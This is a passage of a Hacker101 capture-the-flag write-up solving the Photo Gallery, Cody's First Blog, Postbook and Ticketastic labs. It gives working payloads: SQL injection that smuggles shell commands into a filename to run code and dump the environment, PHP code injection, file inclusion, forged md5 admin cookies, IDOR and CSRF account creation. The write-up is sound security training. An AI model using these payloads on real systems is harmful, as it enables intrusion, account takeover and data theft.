+<h2 id="Photo-Gallery-FLAG2"><a href="#Photo-Gallery-FLAG2" class="headerlink" title="Photo Gallery - FLAG2"></a>Photo Gallery - FLAG2</h2><h3 id="0x00-Space-Used"><a href="#0x00-Space-Used" class="headerlink" title="0x00 Space Used"></a>0x00 Space Used</h3><p><img src="./hacker101-ctf/photo_gallery/flag1/imgs/index.jpg" alt></p>
+<p>We know there are images taking some of the spaces here, but the total space used are showing 0.</p>
+<p>So as we already got the source code of the page, we can check how the space calculated in <a href="http://127.0.0.1/xxxxxxxxxx/?post=6ybKGEfF47eN1k5eyj!lsraaVXFME-xBz51ocCeiAZPULUMIemubmPanqBO04ixb-01L-Qek7nUeXitmNAEMNrJ5BbfeP5GWD1hYEuHciAk81fRa4IyuvmcIG3sE1K11mM7s7hA1P1mChArqJR4i5wSrOF7O561nOHu!lGQcA1iFos-jU6x7iy-TJ4iI4yZjnHkcdXT2F9y6fH4!TY!DcA~~" target="_blank" rel="noopener">line 39</a>.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rep += <span class="string">'&lt;i&gt;Space used: '</span> + subprocess.check_output(<span class="string">'du -ch %s || exit 0'</span> % <span class="string">' '</span>.join(<span class="string">'files/'</span> + fn <span class="keyword">for</span> fn <span class="keyword">in</span> fns), shell=<span class="literal">True</span>, stderr=subprocess.STDOUT).strip().rsplit(<span class="string">'\n'</span>, <span class="number">1</span>)[<span class="number">-1</span>] + <span class="string">'&lt;/i&gt;'</span></span><br></pre></td></tr></table></figure>
+
+<p>So here we can see the commands here.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">du -ch filenames || <span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure>
+
+<p>And we may change file name to inject with commands here.</p>
+<h3 id="0x01-Stacked-Queries"><a href="#0x01-Stacked-Queries" class="headerlink" title="0x01 Stacked Queries"></a>0x01 Stacked Queries</h3><p>As we have the table here</p>
+<table>
+<thead>
+<tr>
+<th>id</th>
+<th>title</th>
+<th>parent</th>
+<th>filename</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>Utterly adorable</td>
+<td>1</td>
+<td>files/adorable.jpg</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Purrfect</td>
+<td>1</td>
+<td>files/purrfect.jpg</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Invisible</td>
+<td>1</td>
+<td>FLAG1</td>
+</tr>
+</tbody></table>
+<p>Try modify image title</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1;<span class="keyword">UPDATE</span> photos <span class="keyword">SET</span> title=<span class="string">'test'</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="number">3</span>;<span class="keyword">COMMIT</span>;<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p>Successfully updated file title 3.</p>
+<p><img src="./hacker101-ctf/photo_gallery/flag2/imgs/filename.jpg" alt></p>
+<h3 id="0x02-Remote-Code-Execution"><a href="#0x02-Remote-Code-Execution" class="headerlink" title="0x02 Remote Code Execution"></a>0x02 Remote Code Execution</h3><p>Now we can update <strong>filename</strong> to perform RCE.</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1;<span class="keyword">UPDATE</span> photos <span class="keyword">SET</span> filename=<span class="string">'* || ls &gt; test.txt'</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="number">3</span>;<span class="keyword">COMMIT</span>;<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p>Visit <strong>INDEX</strong> page to execute the command.</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 UNION <span class="keyword">SELECT</span> <span class="string">'test'</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p>Here we got <strong>ls</strong> results in file <strong>test</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dockerfile files main.py main.pyc prestart.sh requirements.txt test uwsgi.ini</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x03-FLAG-3"><a href="#0x03-FLAG-3" class="headerlink" title="0x03 FLAG"></a>0x03 FLAG</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1;<span class="keyword">UPDATE</span> photos <span class="keyword">SET</span> filename=<span class="string">'* || env &gt; test.txt'</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="number">3</span>;<span class="keyword">COMMIT</span>;<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p>Visit <strong>INDEX</strong> page to execute the command.</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 UNION <span class="keyword">SELECT</span> <span class="string">'test'</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p>Here we got all 3 flags in one place.</p>
+<p><img src="./hacker101-ctf/photo_gallery/flag2/imgs/flag.jpg" alt></p>
+<h2 id="Cody’s-First-Blog"><a href="#Cody’s-First-Blog" class="headerlink" title="Cody’s First Blog"></a>Cody’s First Blog</h2><h3 id="Flag0-–-Found-5"><a href="#Flag0-–-Found-5" class="headerlink" title="Flag0 – Found"></a><a href="./flag0">Flag0</a> – Found</h3><ul>
+<li>What was the first input you saw?</li>
+<li>Figuring out what platform this is running on may give you some ideas</li>
+<li>Code injection usually doesn’t work</li>
+</ul>
+<h3 id="Flag1-–-Found-3"><a href="#Flag1-–-Found-3" class="headerlink" title="Flag1 – Found"></a><a href="./flag1">Flag1</a> – Found</h3><ul>
+<li>Make sure you check everything you’re provided</li>
+<li>Unused code can often lead to information you wouldn’t otherwise get</li>
+<li>Simple guessing might help you out</li>
+</ul>
+<h3 id="Flag2-–-Found-3"><a href="#Flag2-–-Found-3" class="headerlink" title="Flag2 – Found"></a><a href="./flag2">Flag2</a> – Found</h3><ul>
+<li>Read the first blog post carefully</li>
+<li>We talk about this in the Hacker101 File Inclusion Bugs video</li>
+<li>Where can you access your own stored data?</li>
+<li>Include doesn’t just work for filenames</li>
+</ul>
+<h2 id="Cody’s-First-Blog-FLAG0"><a href="#Cody’s-First-Blog-FLAG0" class="headerlink" title="Cody’s First Blog - FLAG0"></a>Cody’s First Blog - FLAG0</h2><h3 id="0x00-Home-1"><a href="#0x00-Home-1" class="headerlink" title="0x00 Home"></a>0x00 Home</h3><p><img src="./hacker101-ctf/codys_first_blog/flag0/imgs/home.jpg" alt></p>
+<h3 id="0x01-Try-with-Comment"><a href="#0x01-Try-with-Comment" class="headerlink" title="0x01 Try with Comment"></a>0x01 Try with Comment</h3><p>Tried XSS, not working.</p>
+<p><img src="./hacker101-ctf/codys_first_blog/flag0/imgs/submit.jpg" alt></p>
+<p>As the blog is PHP, try inject with PHP.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo()<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="./hacker101-ctf/codys_first_blog/flag0/imgs/comment.jpg" alt></p>
+<h3 id="0x02-FLAG-1"><a href="#0x02-FLAG-1" class="headerlink" title="0x02 FLAG"></a>0x02 FLAG</h3><p><img src="./hacker101-ctf/codys_first_blog/flag0/imgs/flag.jpg" alt></p>
+<h2 id="Cody’s-First-Blog-FLAG1"><a href="#Cody’s-First-Blog-FLAG1" class="headerlink" title="Cody’s First Blog - FLAG1"></a>Cody’s First Blog - FLAG1</h2><h3 id="0x00-Home-2"><a href="#0x00-Home-2" class="headerlink" title="0x00 Home"></a>0x00 Home</h3><p><img src="./hacker101-ctf/codys_first_blog/flag0/imgs/home.jpg" alt></p>
+<h3 id="0x01-Check-the-Source"><a href="#0x01-Check-the-Source" class="headerlink" title="0x01 Check the Source"></a>0x01 Check the Source</h3><p>Press <strong>F12</strong> to check the source.</p>
+<p><img src="./hacker101-ctf/codys_first_blog/flag1/imgs/source.jpg" alt></p>
+<p>An admin login address shows up.</p>
+<h3 id="0x02-Visit-Admin-Page"><a href="#0x02-Visit-Admin-Page" class="headerlink" title="0x02 Visit Admin Page"></a>0x02 Visit Admin Page</h3><p><a href="http://127.0.0.1/xxxxxxxxxx/?page=admin.auth.inc" target="_blank" rel="noopener">http://127.0.0.1/xxxxxxxxxx/?page=admin.auth.inc</a></p>
+<p><img src="./hacker101-ctf/codys_first_blog/flag1/imgs/admin.jpg" alt></p>
+<h3 id="0x03-FLAG-4"><a href="#0x03-FLAG-4" class="headerlink" title="0x03 FLAG"></a>0x03 FLAG</h3><p>Try remove <strong>auth</strong> from the url.</p>
+<p><a href="http://127.0.0.1/xxxxxxxxxx/?page=admin.inc" target="_blank" rel="noopener">http://127.0.0.1/xxxxxxxxxx/?page=admin.inc</a></p>
+<p><img src="./hacker101-ctf/codys_first_blog/flag1/imgs/flag.jpg" alt></p>
+<h2 id="Cody’s-First-Blog-FLAG2"><a href="#Cody’s-First-Blog-FLAG2" class="headerlink" title="Cody’s First Blog - FLAG2"></a>Cody’s First Blog - FLAG2</h2><h3 id="0x00-Modifiy-URL-Parameter"><a href="#0x00-Modifiy-URL-Parameter" class="headerlink" title="0x00 Modifiy URL Parameter"></a>0x00 Modifiy URL Parameter</h3><p>Try modify the url</p>
+<p><a href="http://127.0.0.1/xxxxxxxxxx/?page=admin.inc" target="_blank" rel="noopener">http://127.0.0.1/xxxxxxxxxx/?page=admin.inc</a></p>
+<p>To</p>
+<p><a href="http://127.0.0.1/xxxxxxxxxx/?page=index" target="_blank" rel="noopener">http://127.0.0.1/xxxxxxxxxx/?page=index</a></p>
+<p>The error shows</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: Allowed memory size of 134217728 bytes exhausted (tried to allocate 16384 bytes) in /app/index.php on line 20</span><br></pre></td></tr></table></figure>
+
+<p>So it will append <strong>.php</strong> at the end and execute the file.</p>
+<h3 id="0x01-SSRF-Inclusion-Bug"><a href="#0x01-SSRF-Inclusion-Bug" class="headerlink" title="0x01 SSRF / Inclusion Bug"></a>0x01 SSRF / Inclusion Bug</h3><p><a href="http://127.0.0.1/xxxxxxxxxx/?page=http://localhost/index" target="_blank" rel="noopener">http://127.0.0.1/xxxxxxxxxx/?page=http://localhost/index</a></p>
+<p>Both the XSS and phpinfo() injection executed properly.</p>
+<p>But still no flag.</p>
+<p><img src="./hacker101-ctf/codys_first_blog/flag2/imgs/ssrf.jpg" alt></p>
+<h3 id="0x02-Read-File"><a href="#0x02-Read-File" class="headerlink" title="0x02 Read File"></a>0x02 Read File</h3><p>Add a new comment to read index.php.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> readfile(<span class="string">"index.php"</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>And approve it in admin page.</p>
+<p><img src="./hacker101-ctf/codys_first_blog/flag2/imgs/approve.jpg" alt></p>
+<h3 id="0x03-FLAG-5"><a href="#0x03-FLAG-5" class="headerlink" title="0x03 FLAG"></a>0x03 FLAG</h3><p>Press <strong>F12</strong> to check the source again.</p>
+<p><img src="./hacker101-ctf/codys_first_blog/flag2/imgs/flag.jpg" alt></p>
+<p>It print out the whole index.php file.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">// ^FLAG^&#123;FLAG2&#125;$FLAG$</span></span><br><span class="line">	mysql_connect(<span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">""</span>);</span><br><span class="line">	mysql_select_db(<span class="string">"level4"</span>);</span><br><span class="line">	$page = <span class="keyword">isset</span>($_GET[<span class="string">'page'</span>]) ? $_GET[<span class="string">'page'</span>] : <span class="string">'home.inc'</span>;</span><br><span class="line">	<span class="keyword">if</span>(strpos($page, <span class="string">':'</span>) !== <span class="keyword">false</span> &amp;&amp; substr($page, <span class="number">0</span>, <span class="number">5</span>) !== <span class="string">"http:"</span>)</span><br><span class="line">		$page = <span class="string">"home.inc"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'body'</span>])) &#123;</span><br><span class="line">		mysql_query(<span class="string">"INSERT INTO comments (page, body, approved) VALUES ('"</span> . mysql_real_escape_string($page) . <span class="string">"', '"</span> . mysql_real_escape_string($_POST[<span class="string">'body'</span>]) . <span class="string">"', 0)"</span>);</span><br><span class="line">		<span class="keyword">if</span>(strpos($_POST[<span class="string">'body'</span>], <span class="string">'&lt;?php'</span>) !== <span class="keyword">false</span>)</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;p&gt;^FLAG^&#123;FLAG1&#125;$FLAG$&lt;/p&gt;'</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Postbook"><a href="#Postbook" class="headerlink" title="Postbook"></a>Postbook</h2><h3 id="Flag0-–-Found-6"><a href="#Flag0-–-Found-6" class="headerlink" title="Flag0 – Found"></a><a href="./flag0">Flag0</a> – Found</h3><ul>
+<li>The person with username “user” has a very easy password…</li>
+</ul>
+<h3 id="Flag1-–-Found-4"><a href="#Flag1-–-Found-4" class="headerlink" title="Flag1 – Found"></a><a href="./flag1">Flag1</a> – Found</h3><ul>
+<li>Try viewing your own post and then see if you can change the ID</li>
+</ul>
+<h3 id="Flag2-–-Found-4"><a href="#Flag2-–-Found-4" class="headerlink" title="Flag2 – Found"></a><a href="./flag2">Flag2</a> – Found</h3><ul>
+<li>You should definitely use “Inspect Element” on the form when creating a new post</li>
+</ul>
+<h3 id="Flag3-–-Found-1"><a href="#Flag3-–-Found-1" class="headerlink" title="Flag3 – Found"></a><a href="./flag3">Flag3</a> – Found</h3><ul>
+<li>189 * 5</li>
+</ul>
+<h3 id="Flag4-–-Found"><a href="#Flag4-–-Found" class="headerlink" title="Flag4 – Found"></a><a href="./flag4">Flag4</a> – Found</h3><ul>
+<li>You can edit your own posts, what about someone else’s?</li>
+</ul>
+<h3 id="Flag5-–-Found"><a href="#Flag5-–-Found" class="headerlink" title="Flag5 – Found"></a><a href="./flag5">Flag5</a> – Found</h3><ul>
+<li>The cookie allows you to stay signed in. Can you figure out how they work so you can sign in to user with ID 1?</li>
+</ul>
+<h3 id="Flag6-–-Found"><a href="#Flag6-–-Found" class="headerlink" title="Flag6 – Found"></a><a href="./flag6">Flag6</a> – Found</h3><ul>
+<li>Deleting a post seems to take an ID that is not a number. Can you figure out what it is?</li>
+</ul>
+<h2 id="Postbook-FLAG0"><a href="#Postbook-FLAG0" class="headerlink" title="Postbook - FLAG0"></a>Postbook - FLAG0</h2><h3 id="0x00-Index-9"><a href="#0x00-Index-9" class="headerlink" title="0x00 Index"></a>0x00 Index</h3><p><img src="./hacker101-ctf/postbook/flag0/imgs/index.jpg" alt></p>
+<h3 id="0x01-Log-In-2"><a href="#0x01-Log-In-2" class="headerlink" title="0x01 Log In"></a>0x01 Log In</h3><p>Try weak password</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: user</span><br><span class="line">password: password</span><br></pre></td></tr></table></figure>
+
+<p><img src="./hacker101-ctf/postbook/flag0/imgs/login.jpg" alt></p>
+<h3 id="0x02-FLAG-2"><a href="#0x02-FLAG-2" class="headerlink" title="0x02 FLAG"></a>0x02 FLAG</h3><p><img src="./hacker101-ctf/postbook/flag0/imgs/flag.jpg" alt></p>
+<h2 id="Postbook-FLAG1"><a href="#Postbook-FLAG1" class="headerlink" title="Postbook - FLAG1"></a>Postbook - FLAG1</h2><h3 id="0x00-View-Post"><a href="#0x00-View-Post" class="headerlink" title="0x00 View Post"></a>0x00 View Post</h3><p><a href="http://127.0.0.1/1234567890/index.php?page=view.php&amp;id=1" target="_blank" rel="noopener">http://127.0.0.1/1234567890/index.php?page=view.php&amp;id=1</a></p>
+<p><img src="./hacker101-ctf/postbook/flag1/imgs/post.jpg" alt></p>
+<h3 id="0x01-FLAG"><a href="#0x01-FLAG" class="headerlink" title="0x01 FLAG"></a>0x01 FLAG</h3><p>The id seems can be change.</p>
+<p><a href="http://127.0.0.1/1234567890/index.php?page=view.php&amp;id=2" target="_blank" rel="noopener">http://127.0.0.1/1234567890/index.php?page=view.php&amp;id=2</a></p>
+<p><img src="./hacker101-ctf/postbook/flag1/imgs/flag.jpg" alt></p>
+<h2 id="Postbook-FLAG2"><a href="#Postbook-FLAG2" class="headerlink" title="Postbook - FLAG2"></a>Postbook - FLAG2</h2><h3 id="0x00-New-Post"><a href="#0x00-New-Post" class="headerlink" title="0x00 New Post"></a>0x00 New Post</h3><p><img src="./hacker101-ctf/postbook/flag2/imgs/new_post.jpg" alt></p>
+<p>There is a hidden value shows <strong>user_id = 2</strong>.</p>
+<p>Change it to 1 which may post as other people.</p>
+<p><img src="./hacker101-ctf/postbook/flag2/imgs/test_post.jpg" alt></p>
+<h3 id="0x01-FLAG-1"><a href="#0x01-FLAG-1" class="headerlink" title="0x01 FLAG"></a>0x01 FLAG</h3><p><img src="./hacker101-ctf/postbook/flag2/imgs/flag.jpg" alt></p>
+<h2 id="Postbook-FLAG3"><a href="#Postbook-FLAG3" class="headerlink" title="Postbook - FLAG3"></a>Postbook - FLAG3</h2><h3 id="0x00-View-Post-1"><a href="#0x00-View-Post-1" class="headerlink" title="0x00 View Post"></a>0x00 View Post</h3><p><a href="http://127.0.0.1/1234567890/index.php?page=view.php&amp;id=1" target="_blank" rel="noopener">http://127.0.0.1/1234567890/index.php?page=view.php&amp;id=1</a></p>
+<p><img src="./hacker101-ctf/postbook/flag3/imgs/post.jpg" alt></p>
+<h3 id="0x01-FLAG-2"><a href="#0x01-FLAG-2" class="headerlink" title="0x01 FLAG"></a>0x01 FLAG</h3><p>The id seems can be change to very large value (189 * 5 = 945).</p>
+<p><a href="http://127.0.0.1/1234567890/index.php?page=view.php&amp;id=945" target="_blank" rel="noopener">http://127.0.0.1/1234567890/index.php?page=view.php&amp;id=945</a></p>
+<p><img src="./hacker101-ctf/postbook/flag3/imgs/flag.jpg" alt></p>
+<h2 id="Postbook-FLAG4"><a href="#Postbook-FLAG4" class="headerlink" title="Postbook - FLAG4"></a>Postbook - FLAG4</h2><h3 id="0x00-Edit-Post"><a href="#0x00-Edit-Post" class="headerlink" title="0x00 Edit Post"></a>0x00 Edit Post</h3><p><a href="http://127.0.0.1/1234567890/index.php?page=edit.php&amp;id=3" target="_blank" rel="noopener">http://127.0.0.1/1234567890/index.php?page=edit.php&amp;id=3</a></p>
+<p><img src="./hacker101-ctf/postbook/flag4/imgs/edit.jpg" alt></p>
+<h3 id="0x01-Edit-Others-Post"><a href="#0x01-Edit-Others-Post" class="headerlink" title="0x01 Edit Others Post"></a>0x01 Edit Others Post</h3><p>The id seems can be change.</p>
+<p><a href="http://127.0.0.1/1234567890/index.php?page=edit.php&amp;id=1" target="_blank" rel="noopener">http://127.0.0.1/1234567890/index.php?page=edit.php&amp;id=1</a></p>
+<p><img src="./hacker101-ctf/postbook/flag4/imgs/edit_others.jpg" alt></p>
+<h3 id="0x02-FLAG-3"><a href="#0x02-FLAG-3" class="headerlink" title="0x02 FLAG"></a>0x02 FLAG</h3><p>Save the edit result. Get the flag.</p>
+<p><img src="./hacker101-ctf/postbook/flag4/imgs/flag.jpg" alt></p>
+<h2 id="Postbook-FLAG5"><a href="#Postbook-FLAG5" class="headerlink" title="Postbook - FLAG5"></a>Postbook - FLAG5</h2><h3 id="0x00-Cookie"><a href="#0x00-Cookie" class="headerlink" title="0x00 Cookie"></a>0x00 Cookie</h3><p>user cookie</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id: &quot;c81e728d9d4c2f636f067f89cc14862c&quot;</span><br></pre></td></tr></table></figure>
+
+<p>Check at <a href="http://127.0.0.1/xxxxxxxxxx/?post=6ybKGEfF47eN1k5eyj!lsraaVXFME-xBz51ocCeiAZPULUMIemubmPanqBO04ixb-01L-Qek7nUeXitmNAEMNrJ5BbfeP5GWD1hYEuHciAk81fRa4IyuvmcIG3sE1K11mM7s7hA1P1mChArqJR4i5wSrOF7O561nOHu!lGQcA1iFos-jU6x7iy-TJ4iI4yZjnHkcdXT2F9y6fH4!TY!DcA~~" target="_blank" rel="noopener">cmd5.com</a>. It is just md5 value of 2.</p>
+<p><img src="./hacker101-ctf/postbook/flag5/imgs/cookie.jpg" alt></p>
+<h3 id="0x01-Admin-Cookie"><a href="#0x01-Admin-Cookie" class="headerlink" title="0x01 Admin Cookie"></a>0x01 Admin Cookie</h3><p>md5(1)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id: &quot;c4ca4238a0b923820dcc509a6f75849b&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-FLAG-4"><a href="#0x02-FLAG-4" class="headerlink" title="0x02 FLAG"></a>0x02 FLAG</h3><p>Successfully login as admin.</p>
+<p><img src="./hacker101-ctf/postbook/flag5/imgs/flag.jpg" alt></p>
+<h2 id="Postbook-FLAG6"><a href="#Postbook-FLAG6" class="headerlink" title="Postbook - FLAG6"></a>Postbook - FLAG6</h2><h3 id="0x00-Delete-Post"><a href="#0x00-Delete-Post" class="headerlink" title="0x00 Delete Post"></a>0x00 Delete Post</h3><p><a href="http://127.0.0.1/1234567890/index.php?page=delete.php&amp;id=eccbc87e4b5ce2fe28308fd9f2a7baf3" target="_blank" rel="noopener">http://127.0.0.1/1234567890/index.php?page=delete.php&amp;id=eccbc87e4b5ce2fe28308fd9f2a7baf3</a></p>
+<p>Where <strong>id=eccbc87e4b5ce2fe28308fd9f2a7baf3</strong> is also <a href="http://127.0.0.1/xxxxxxxxxx/?post=6ybKGEfF47eN1k5eyj!lsraaVXFME-xBz51ocCeiAZPULUMIemubmPanqBO04ixb-01L-Qek7nUeXitmNAEMNrJ5BbfeP5GWD1hYEuHciAk81fRa4IyuvmcIG3sE1K11mM7s7hA1P1mChArqJR4i5wSrOF7O561nOHu!lGQcA1iFos-jU6x7iy-TJ4iI4yZjnHkcdXT2F9y6fH4!TY!DcA~~" target="_blank" rel="noopener">md5</a> value of post id.</p>
+<p><img src="./hacker101-ctf/postbook/flag6/imgs/delete.jpg" alt></p>
+<h3 id="0x01-Delete-Others"><a href="#0x01-Delete-Others" class="headerlink" title="0x01 Delete Others"></a>0x01 Delete Others</h3><p><a href="http://127.0.0.1/1234567890/index.php?page=delete.php&amp;id=c4ca4238a0b923820dcc509a6f75849b" target="_blank" rel="noopener">http://127.0.0.1/1234567890/index.php?page=delete.php&amp;id=c4ca4238a0b923820dcc509a6f75849b</a></p>
+<h3 id="0x02-FLAG-5"><a href="#0x02-FLAG-5" class="headerlink" title="0x02 FLAG"></a>0x02 FLAG</h3><p><img src="./hacker101-ctf/postbook/flag6/imgs/flag.jpg" alt></p>
+<h2 id="Ticketastic-Live-Instance"><a href="#Ticketastic-Live-Instance" class="headerlink" title="Ticketastic: Live Instance"></a>Ticketastic: Live Instance</h2><h3 id="Flag0-–-Found-7"><a href="#Flag0-–-Found-7" class="headerlink" title="Flag0 – Found"></a><a href="./flag0">Flag0</a> – Found</h3><ul>
+<li>This level and the Ticketastic demo instance are running the same code</li>
+<li>Take a look at addUser on the demo instance</li>
+<li>What is missing?</li>
+<li>Humans might read these tickets and interact with them</li>
+<li>Links in tickets could be interesting</li>
+</ul>
+<h3 id="Flag1-–-Found-5"><a href="#Flag1-–-Found-5" class="headerlink" title="Flag1 – Found"></a><a href="./flag1">Flag1</a> – Found</h3><ul>
+<li>How do others log into this instance?</li>
+<li>The login form reveals more than it should</li>
+<li>So does the ticket endpoint</li>
+</ul>
+<h2 id="Ticketastic-Live-Instance-FLAG0"><a href="#Ticketastic-Live-Instance-FLAG0" class="headerlink" title="Ticketastic: Live Instance - FLAG0"></a>Ticketastic: Live Instance - FLAG0</h2><h3 id="0x00-Index-10"><a href="#0x00-Index-10" class="headerlink" title="0x00 Index"></a>0x00 Index</h3><p><img src="./hacker101-ctf/ticketastic_live_instance/flag0/imgs/index.jpg" alt></p>
+<h3 id="0x01-Login"><a href="#0x01-Login" class="headerlink" title="0x01 Login"></a>0x01 Login</h3><p>Tried login with admin/admin but shows <strong>Invalid Password</strong>.</p>
+<p>Also tried to run a wordlist against the password. Still cannot log in.</p>
+<p><img src="./hacker101-ctf/ticketastic_live_instance/flag0/imgs/login.jpg" alt></p>
+<h3 id="0x02-Submit-Ticket"><a href="#0x02-Submit-Ticket" class="headerlink" title="0x02 Submit Ticket"></a>0x02 Submit Ticket</h3><p>The only thing can be done here is to submit a ticket.</p>
+<p>As there is also a <strong>Demo Instance</strong> abailable for looking inside of the system. </p>
+<p>There is a CSRF can be used here which can help to crete a new account.</p>
+<p><a href="https://localhost/newUser?username=test&amp;password=test&amp;password2=test" target="_blank" rel="noopener">https://localhost/newUser?username=test&amp;password=test&amp;password2=test</a></p>
+<p>So just submit a ticket with the content below.</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://localhost/newUser?username=test&amp;password=test&amp;password2=test"</span>&gt;</span>TEST<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="./hacker101-ctf/ticketastic_live_instance/flag0/imgs/ticket.jpg" alt></p>
+<h3 id="0x03-Login-with-New-Account"><a href="#0x03-Login-with-New-Account" class="headerlink" title="0x03 Login with New Account"></a>0x03 Login with New Account</h3><p><img src="./hacker101-ctf/ticketastic_live_instance/flag0/imgs/admin.jpg" alt></p>
+<h3 id="0x04-FLAG-1"><a href="#0x04-FLAG-1" class="headerlink" title="0x04 FLAG"></a>0x04 FLAG</h3><p>Chek the ticket for FLAG0.</p>
+<p><img src="./hacker101-ctf/ticketastic_live_instance/flag0/imgs/flag.jpg" alt></p>
+<h2 id="Ticketastic-Live-Instance-FLAG1"><a href="#Ticketastic-Live-Instance-FLAG1" class="headerlink" title="Ticketastic: Live Instance - FLAG1"></a>Ticketastic: Live Instance - FLAG1</h2><h3 id="0x00-Ticket-Page"><a href="#0x00-Ticket-Page" class="headerlink" title="0x00 Ticket Page"></a>0x00 Ticket Page</h3><p><a href="http://127.0.0.1/xxxxxxxxxx/ticket?id=1" target="_blank" rel="noopener">http://127.0.0.1/xxxxxxxxxx/ticket?id=1</a></p>
+<p><img src="./hacker101-ctf/ticketastic_live_instance/flag0/imgs/flag.jpg" alt></p>
+<h3 id="0x01-Try-Modify-Parameters"><a href="#0x01-Try-Modify-Parameters" class="headerlink" title="0x01 Try Modify Parameters"></a>0x01 Try Modify Parameters</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ticket?id=1'</span><br></pre></td></tr></table></figure>
+
+<p>Get some error message</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;./main.py&quot;, line 78, in ticket</span><br><span class="line">    cur.execute(&apos;SELECT title, body, reply FROM tickets WHERE id=%s&apos; % request.args[&apos;id&apos;])</span><br><span class="line">  File &quot;/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py&quot;, line 255, in execute</span><br><span class="line">    self.errorhandler(self, exc, value)</span><br><span class="line">  File &quot;/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py&quot;, line 50, in defaulterrorhandler</span><br><span class="line">    raise errorvalue</span><br><span class="line">ProgrammingError: (1064, &quot;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &apos;&apos;&apos; at line 1&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>So it uses MySQL database and seems can be injected here.</p>
+<p>Double check by try. The first link works but the second one shows error.</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ticket?id=1 AND 1=1</span><br><span class="line">ticket?id=1 AND 1=2</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-Get-Table-Fields-Number"><a href="#0x02-Get-Table-Fields-Number" class="headerlink" title="0x02 Get Table Fields Number"></a>0x02 Get Table Fields Number</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ticket?id=1 AND 1=1 ORDER BY 10</span><br><span class="line">ticket?id=1 AND 1=1 ORDER BY 3</span><br></pre></td></tr></table></figure>
+
